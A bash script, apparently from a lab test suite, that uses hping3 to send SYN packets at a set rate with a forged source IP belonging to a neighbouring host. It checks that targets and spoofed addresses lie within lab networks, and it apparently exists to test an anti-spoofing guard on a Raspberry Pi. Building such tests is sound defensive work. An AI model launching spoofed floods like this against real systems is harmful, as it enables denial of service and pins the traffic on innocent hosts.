#!/usr/bin/env bash
# IP spoof of a bound neighbour (hping3 -a): my MAC, a neighbour's IP. The raw guard's case. Attacker host only.
#   bash lab/attacks/spoof_neighbour.sh --target <pi-or-victim-ip> --spoof-ip <bound neighbour, in the LAN> \
#        --pi-ip IP --victim-net CIDR --protected-net CIDR [--rate 800] [--port 80] [--duration 10] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
RATE=800
PORT=80
SPOOF=""
set -- "${REST[@]}"
while (($#)); do
  case "$1" in
    --rate) RATE="${2:?}"; shift ;;
    --port) PORT="${2:?}"; shift ;;
    --spoof-ip) SPOOF="${2:?}"; shift ;;
    *) no_extra_args "$@" ;;
  esac
  shift
done
require_number "$RATE" "--rate"
require_number "$PORT" "--port"
require_lab_target
[[ -n "$SPOOF" ]] || refuse "--spoof-ip (a bound neighbour's address) is required"
require_in_protected "$SPOOF" "--spoof-ip"
[[ "$SPOOF" != "$PI_IP" ]] || refuse "--spoof-ip must be a neighbour, not the Pi"
tool_version hping3
run_attack hping3 -q -S -p "$PORT" -i "u$(rate_interval_us "$RATE")" -a "$SPOOF" "$DEST"
